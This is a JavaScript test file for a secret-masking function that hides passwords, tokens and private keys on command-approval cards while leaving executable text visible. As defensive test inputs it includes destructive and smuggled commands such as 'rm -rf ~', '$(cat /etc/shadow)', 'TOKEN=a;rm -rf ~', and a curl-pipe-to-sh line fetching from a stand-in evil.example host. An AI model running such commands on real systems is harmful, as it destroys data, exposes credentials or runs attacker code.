/**
 * Approval-card secret masking, the Crow side (contract with pi-lab,
 * 2026-10-26, final rules of pi-lab fa30563): one shared maskSecrets() with
 * pi-lab's pattern set plus exact values. Heuristic masking must never hide
 * anything that could execute: text piped or here-stringed into sudo -S, and
 * heredoc bodies, are hidden ONLY by exact values; every pattern candidate
 * must be password-like and not a host or a path; PEM only in its strict key
 * shape. Every fake below is assembled at runtime from obviously fake parts,
 * so no literal in this file looks like a real credential (the public hygiene
 * guard reads tracked files line by line).
 */
import { test } from "node:test";
import assert from "node:assert/strict";

const { maskSecrets, maskSecretsDetailed, REDACTED, displayEscape, hiddenNote } = await import("../servers/shared/secret-mask.js");

const FAKE = "fake-" + "pw-" + "0000";            // a stand-in password, never a real one
const S = "-" + "S";                                 // sudo's read-stdin flag, kept apart from "sudo"
const none = { values: [] };
const m = (t, values = []) => maskSecrets(t, { values });
const pipe = (word, target = "systemctl restart x") => ["echo", word, "|", "sudo", S, target].join(" ");

test("the 10-25 shape: hidden by the exact value; with no value it stays byte-identical (it could be stdin code)", () => {
  const cmd = pipe('"' + FAKE + '"');
  assert.equal(m(cmd, [FAKE]), pipe('"' + REDACTED + '"'));
  assert.equal(m(cmd), cmd, "no pattern for sudo -S stdin");
  assert.equal(m(pipe('"rm -rf ~"', "bash")), pipe('"rm -rf ~"', "bash"), "code fed to a shell is never hidden");
});

test("here-strings and heredocs into sudo -S: exact values only", () => {
  const hs = "sudo " + S + " ls <<< " + FAKE;
  assert.equal(m(hs), hs);
  assert.equal(m(hs, [FAKE]), "sudo " + S + " ls <<< " + REDACTED);
  const heredoc = "sudo " + S + " bash <<EOF\nrm -rf /tmp/x\n" + FAKE + "\nEOF";
  assert.equal(m(heredoc), heredoc);
  assert.equal(m(displayEscape(heredoc), [FAKE]).includes(FAKE), false);
  assert.match(m(displayEscape(heredoc), [FAKE]), /rm -rf \/tmp\/x/);
});

test("sshpass, mysql -p, PGPASSWORD, --password and --passwd", () => {
  const SSHPASS = "sshpass" + " -p";
  for (const cmd of [
    SSHPASS + " " + FAKE + " ssh host",
    SSHPASS + "'" + FAKE + "' ssh host",
    "mysql -u root -p" + FAKE + " db",
    "PGPASSWORD=" + FAKE + " psql -h x",
    "tool --password=" + FAKE,
    "tool --password " + FAKE,
    "tool --passwd " + FAKE,
  ]) {
    assert.equal(m(cmd).includes(FAKE), false, cmd);
  }
  assert.equal(m("mysql -u root -p db"), "mysql -u root -p db", "-p alone prompts");
  assert.equal(m("mysql -u root -p " + FAKE), "mysql -u root -p " + FAKE, "-p WORD: WORD is the database");
});

test("Authorization, X-Api-Key and token query values", () => {
  for (const cmd of [
    'curl -H "Authorization: Bearer ' + FAKE + '" http://x',
    "curl -H 'authorization: basic " + FAKE + "' http://x",
    'curl -H "X-Api-Key: ' + FAKE + '" http://x',
    "curl http://x/?token=" + FAKE + "&a=1",
    "curl 'http://x/?a=1&token=" + FAKE + "'",
    "curl http://x/?api_key=" + FAKE,
  ]) {
    assert.equal(m(cmd).includes(FAKE), false, cmd);
  }
  assert.match(m("curl http://x/?token=" + FAKE + "&a=1"), /&a=1$/);
});

test("NAME=value for secret-like names; MAX_TOKENS, BYPASS_X and references stay visible", () => {
  for (const name of ["DB_PASS", "ADMIN_PASSWORD", "app_secret", "GH_TOKEN", "OPENAI_API_KEY", "MY_APIKEY", "SSH_PRIVATE_KEY", "private_key", "PGPASSWORD"]) {
    assert.equal(m(name + "=" + FAKE + " ./run"), name + "=" + REDACTED + " ./run", name);
  }
  for (const t of ["PORT=8080 HOST=localhost ./run", 'PW_FILE="$HOME/x" TOKEN=$TOKEN ./run', "MAX_TOKENS=4096 ./run", "BYPASS_CACHE=" + FAKE]) {
    assert.equal(m(t), t, t);
  }
});

test("a pattern never hides code, a host or a path", () => {
  for (const t of [
    'GH_TOKEN="$(cat /etc/shadow)" ./run',
    "DB_PASSWORD=/run/secrets/db ./run",
    "API_KEY=`id` ./run",
    "TOKEN=a;rm -rf ~ ./run",
    "sshpass" + " -p " + "./script.sh ssh host",
  ]) {
    assert.equal(m(t), t, t);
  }
});

test("known token shapes", () => {
  for (const tok of [
    "gh" + "p_" + "A".repeat(36),
    "github" + "_pat_" + "B".repeat(30),
    "t" + "k_" + "c".repeat(29),
    "s" + "k-" + "d".repeat(30),
    "AK" + "IA" + "E".repeat(16),
  ]) {
    assert.equal(m("use " + tok + " now"), "use " + REDACTED + " now", tok.slice(0, 6));
  }
  assert.equal(m("api: sk-" + "no-key-required"), "api: sk-" + "no-key-required");
});

test("PEM: only the strict key shape is hidden; anything else between the markers stays visible", () => {
  const dash = "-".repeat(5);
  const b64 = (n) => "Q".repeat(n);
  const block = (body) => dash + "BEGIN RSA PRIVATE KEY" + dash + "\n" + body + "\n" + dash + "END RSA PRIVATE KEY" + dash;
  const key = block([b64(64), b64(64), b64(20)].join("\n"));
  const out = m("key:\n" + key + "\nafter");
  assert.equal(out.includes(b64(64)), false);
  assert.match(out, /after$/);
  assert.equal(m(displayEscape("key:\n" + key)).includes(b64(64)), false, "escaped \\n lines too");
  for (const body of ["bash /tmp/x", "# reboot", b64(64), b64(64) + "\n" + b64(10) + " x"]) {
    const t = "k:\n" + block(body);
    assert.equal(m(t), t, body);
  }
  const mid = "x " + dash + "BEGIN RSA PRIVATE KEY" + dash + "\n" + [b64(64), b64(64)].join("\n") + "\n" + dash + "END RSA PRIVATE KEY" + dash;
  assert.equal(m(mid), mid, "BEGIN mid-line");
  assert.equal(m("k:\n" + block("bash /tmp/x"), ["bash /tmp/x"]).includes("bash /tmp/x"), false, "an exact value still masks");
});

test("exact values: raw, escaped and JSON-escaped forms, every occurrence, longest first; < 6 chars ignored", () => {
  const v = "plain-" + "value-1";
  const longer = v + "-extended";
  assert.equal(m("a " + longer + " b " + v + " c " + v, [v, longer]), "a " + REDACTED + " b " + REDACTED + " c " + REDACTED);
  const odd = "back\\" + "slash-" + "é";
  assert.equal(m("x " + displayEscape(odd) + " y", [odd]), "x " + REDACTED + " y");
  const q = 'quo"te-' + "value-1";
  assert.equal(JSON.parse(m(JSON.stringify({ command: "login " + q }), [q])).command, "login " + REDACTED);
  assert.equal(m("abc12 abc12", ["abc12"]), "abc12 abc12");
});

test("a value cut by pi-lab's display limit: its leading part before the marker is hidden, at any length", () => {
  const v = "cut-" + "secret-" + "value-123456";
  assert.equal(m("run x " + v.slice(0, 12) + "\u2026(40 more characters)", [v]), "run x " + REDACTED + "\u2026(40 more characters)");
  const long = "tok" + "x9".repeat(98) + "z";                 // 200 characters
  assert.equal(long.length, 200);
  const shown = "curl -d " + long.slice(0, 150) + "\u2026(50 more characters)";
  assert.equal(m(shown, [long]), "curl -d " + REDACTED + "\u2026(50 more characters)");
  assert.equal(m("run x " + v.slice(0, 5) + "\u2026(9 more characters)", [v]), "run x " + v.slice(0, 5) + "\u2026(9 more characters)", "under 6: left alone");
  assert.equal(m("a\u2026(3 more characters)"), "a\u2026(3 more characters)");
});

test("count, idempotence, a clean text byte-identical, non-strings", () => {
  const cmd = "GH_TOKEN=" + FAKE + " push; " + pipe(FAKE);
  const r = maskSecretsDetailed(cmd, { values: [FAKE] });
  assert.equal(r.count, 2);
  assert.equal(maskSecretsDetailed(r.text, { values: [FAKE] }).count, 0);
  const clean = "rm -rf /tmp/build && ls -la ~/x \"quoted\" 'single' | grep y";
  assert.equal(m(clean), clean);
  assert.equal(maskSecrets(null, none), "");
  assert.equal(maskSecrets(undefined, none), "");
  assert.equal(maskSecrets(42, none), "42");
});

test("long adversarial texts stay fast (no catastrophic backtracking)", () => {
  const v = "adversarial-" + "value-xyz";
  const long = "L".repeat(4000);
  const t0 = Date.now();
  m(("echo " + "a".repeat(50) + " ").repeat(200) + "| " + "x ".repeat(5000));
  m("sshpass " + "a ".repeat(20000));
  m("mysql " + "a ".repeat(20000));
  m("A".repeat(50000) + "=");
  m(("x".repeat(390) + "\u2026(5 more characters)").repeat(250), [v, v + "2", long]);
  m(("L".repeat(3999) + "\u2026(1 more characters)").repeat(25), [long]);
  m("-".repeat(5) + "BEGIN RSA PRIVATE KEY" + "-".repeat(5) + "\n" + "Q".repeat(100000));
  assert.ok(Date.now() - t0 < 2000, "took " + (Date.now() - t0) + " ms");
});

test("hiddenNote: pi-lab's first-line wording, word for word", () => {
  const tail = " This request contains a secret; approving runs it with the real, unmasked value.";
  assert.equal(hiddenNote(1), "(1 secret value(s) hidden from this card)" + tail);
  assert.equal(hiddenNote(3), "(3 secret value(s) hidden from this card)" + tail);
});

test("a host after ssh/scp/rsync/curl is never masked, however much whitespace follows the command", () => {
  const tok = "s" + "k-" + "h".repeat(30);
  const t = "ssh" + " ".repeat(400) + tok;
  assert.equal(m(t), t);
});

test("a masking failure is reported (failed), never the raw text; oversized input is cut before masking", () => {
  const boom = { [Symbol.iterator]() { throw new Error("boom"); } };
  const r = maskSecretsDetailed("GH_TOKEN=" + FAKE, { values: boom });
  assert.equal(r.failed, true);
  assert.equal(r.text, REDACTED);
  const big = "x".repeat(3 * 1024 * 1024) + " GH_TOKEN=" + FAKE;
  const out = maskSecretsDetailed(big, none);
  assert.equal(out.failed, undefined);
  assert.equal(out.truncated, true, "the caller learns the text was cut");
  assert.equal(out.text.includes(FAKE), false);
  assert.ok(out.text.length < big.length);
});

test("PEM: any consistent width up to 76 (OpenSSH 70, 76) and CRLF line ends", () => {
  const dash = "-".repeat(5);
  const block = (label, lines, eol = "\n") => dash + "BEGIN " + label + "PRIVATE KEY" + dash + eol + lines.join(eol) + eol + dash + "END " + label + "PRIVATE KEY" + dash;
  for (const [label, w] of [["OPENSSH ", 70], ["RSA ", 76], ["", 64]]) {
    const key = block(label, ["Q".repeat(w), "Q".repeat(w), "Q".repeat(12)]);
    assert.equal(m("k:\n" + key).includes("Q".repeat(w)), false, label + w);
  }
  const crlf = block("RSA ", ["Q".repeat(64), "Q".repeat(64), "Q".repeat(10)], "\r\n");
  assert.equal(m("k:\n" + crlf).includes("Q".repeat(64)), false, "CRLF");
  for (const lines of [["Q".repeat(77), "Q".repeat(77), "Q"], ["Q".repeat(64), "Q".repeat(70), "Q".repeat(5)]]) {
    const t = "k:\n" + block("RSA ", lines);
    assert.equal(m(t), t, "wider than 76 or inconsistent widths stay visible");
  }
});

test("PEM: a block whose END was cut off is hidden only when every visible body line is base64", () => {
  const dash = "-".repeat(5);
  const begin = dash + "BEGIN OPENSSH PRIVATE KEY" + dash;
  const cut = "k:\n" + begin + "\n" + "Q".repeat(70) + "\n" + "Q".repeat(70) + "\n" + "Q".repeat(30) + "\u2026(900 more characters)";
  const out = m(cut);
  assert.equal(out.includes("Q".repeat(30)), false, out.slice(0, 80));
  assert.match(out, /\u2026\(900 more characters\)$/);
  assert.equal(m(displayEscape("k:\n" + begin + "\n" + "Q".repeat(70) + "\n" + "Q".repeat(40))).includes("Q".repeat(40)), false, "escaped, cut at the end of the text");
  for (const t of [
    "k:\n" + begin + "\n" + "Q".repeat(70) + "\nbash /tmp/x",
    "k:\n" + begin + "\nreboot",
    "k:\n" + begin + "\n" + "Q".repeat(70) + "\n\nAllow this once?",
  ]) {
    assert.equal(m(t), t, t.slice(-20));
  }
});

test("a credential context hides a value with a slash in it; only a leading path stays visible", () => {
  const v = "abc/" + "def123";
  for (const t of ["DB_PASSWORD=" + v, 'curl -H "Authorization: Bearer ' + v + '"', "tool --password " + v, "sshpass" + " -p " + v + " ssh h"]) {
    assert.equal(m(t).includes(v), false, t);
  }
  for (const t of ["DB_PASSWORD=/run/secrets/db", "TOKEN_FILE=~/tok", "API_KEY=./key.txt", "SECRET=../x"]) {
    assert.equal(m(t), t, t);
  }
});

test("card mode (an approval card or ask): no PEM heuristic at all, since key-shaped rows can run as commands", () => {
  const dash = "-".repeat(5);
  const rows = ["/tmp/" + "a".repeat(59), "M".repeat(64), "sh"];
  const t = "k:\n" + dash + "BEGIN PRIVATE KEY" + dash + "\n" + rows.join("\n") + "\n" + dash + "END PRIVATE KEY" + dash;
  assert.equal(maskSecrets(t, { values: [], card: true }), t);
  const cut = "k:\n" + dash + "BEGIN PRIVATE KEY" + dash + "\n" + "/tmp/" + "a".repeat(35) + "\nreboot";
  assert.equal(maskSecrets(cut, { values: [], card: true }), cut);
  const real = "k:\n" + dash + "BEGIN RSA PRIVATE KEY" + dash + "\n" + ["Q".repeat(64), "Q".repeat(64), "Q".repeat(20)].join("\n") + "\n" + dash + "END RSA PRIVATE KEY" + dash;
  assert.equal(maskSecrets(real, { values: [], card: true }), real, "even a real-looking key: exact values only on a card");
  assert.equal(maskSecrets(real, { values: ["Q".repeat(64)], card: true }).includes("Q".repeat(64)), false);
  assert.equal(m(real).includes("Q".repeat(64)), false, "display paths keep the PEM rule");
});

test("card mode: a URL or relative path in a credential context stays visible (pi-lab's pathLike), since it can run", () => {
  const card = (t) => maskSecrets(t, { values: [], card: true });
  for (const t of [
    "X_TOKEN=https://evil.example/p.sh; curl -s $X_TOKEN | sh",
    "MY_TOKEN=scripts/evil.sh; bash $MY_TOKEN",
  ]) {
    assert.equal(card(t), t, t);
  }
  assert.equal(m("DB_PASSWORD=abc/" + "def123").includes("def123"), false, "display paths keep the leading-only exemption");
});

test("no prefix rule reaches across a real newline into the next line", () => {
  for (const t of [
    "echo --passwd\nevilcmd123",
    "# sshpass\nbash -p evilscript1",
    "note authorization: bearer\nevilcmd123",
    "x-api-key:\nevilcmd123",
    "# mysql\nfoo -pevilscript1",
  ]) {
    assert.equal(m(t), t, JSON.stringify(t));
    assert.equal(maskSecrets(t, { values: [], card: true }), t, JSON.stringify(t));
  }
  assert.equal(m("tool --password " + FAKE).includes(FAKE), false, "same line still masks");
});

test("card mode honours a cut marker only at the very end of the text (no forged-marker prefix oracle)", () => {
  const v = "cut-" + "secret-" + "value-123456";
  const forged = "probe " + v.slice(0, 10) + "…(9 more characters) and more text";
  assert.equal(maskSecrets(forged, { values: [v], card: true }), forged);
  const atEnd = "run x " + v.slice(0, 12) + "…(40 more characters)";
  assert.equal(maskSecrets(atEnd, { values: [v], card: true }), "run x " + REDACTED + "…(40 more characters)");
});
